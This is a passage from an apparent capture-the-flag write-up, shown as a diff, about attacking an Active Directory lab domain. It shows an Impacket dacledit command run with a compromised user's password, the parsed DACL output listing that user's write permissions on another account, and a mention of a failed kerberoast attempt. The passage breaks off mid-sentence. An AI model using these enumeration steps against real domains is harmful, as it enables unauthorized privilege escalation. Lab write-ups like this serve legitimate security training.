@@ -555,5 +555,32 @@ Also after getting a session as `caleb.turner` i can get the user flag
 So ive tried to do a targeted kerberoast attack, but there is no support the the encryption type, and i dont have the rights to change the encryption type on the user
 
 ```python
+dacledit.py -dc-host dc.hsm-defense.local -target-dn 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' -action read -principal caleb.turner hsm-defense.local/caleb.turner:'//newpassword123' -k
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Parsing DACL
+[*] Printing parsed DACL
+[*] Filtering results for SID (S-1-5-21-1508256018-1502282808-1859300581-1112)
+[*]   ACE[4] info                
+[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+[*]     ACE flags                 : None
+[*]     Access mask               : WriteProperty (0x20)
+[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+[*]     Object type (GUID)        : RDN (bf967a0e-0de6-11d0-a285-00aa003049e2)
+[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
+[*]   ACE[5] info                
+[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+[*]     ACE flags                 : None
+[*]     Access mask               : WriteProperty (0x20)
+[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+[*]     Object type (GUID)        : Public-Information (e48d0154-bcf8-11d1-8702-00c04fb96050)
+[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
+[*]   ACE[21] info                
+[*]     ACE Type                  : ACCESS_ALLOWED_ACE
+[*]     ACE flags                 : None
+[*]     Access mask               : ReadControl, Delete, ReadProperties, ListChildObjects (0x30014)
+[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
 ```
+
+Ill read the DACL info, and i notice something, the user `caleb.turner` has all
